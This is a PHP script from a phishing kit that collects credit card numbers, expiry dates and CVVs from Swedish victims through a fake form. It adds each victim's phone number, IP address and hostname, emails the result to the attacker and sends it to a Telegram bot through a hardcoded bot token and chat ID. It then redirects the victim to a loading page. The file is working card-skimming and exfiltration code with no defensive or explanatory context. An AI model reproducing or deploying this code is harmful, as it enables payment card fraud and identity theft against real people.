<?php

session_start();

$cc=$_POST["cc"];
$date=$_POST["date"];
$cvv=$_POST["cvv"];

$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['cc'] = $cc;
        $_SESSION['date'] = $date;
        $_SESSION['cvv'] = $cvv;

        



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|Login Sweden |----------|\n";
$message .= "Phone  : ".$_SESSION['phone']."\n";
$message .= "|----------|CC Sweden |----------|\n";
$message .= "Credit Card  : ".$_SESSION['cc']."\n";
$message .= "Date  : ".$_SESSION['date']."\n";
$message .= "CVV  : ".$_SESSION['cvv']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";

$subject = "~ <Rslt- Sweden>- Coded By k4iser.a ~ | $ip";

mail($email, $subject, $message);

$token = "6520712149:AAHeVzmz0NP_Cr4iOQKG6ZcOAg_nAEcuAZM";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4091871371&text=" . urlencode($message)."" );
header("location:load1.php?vc?__event=card&service_id=top_card=AU")
?>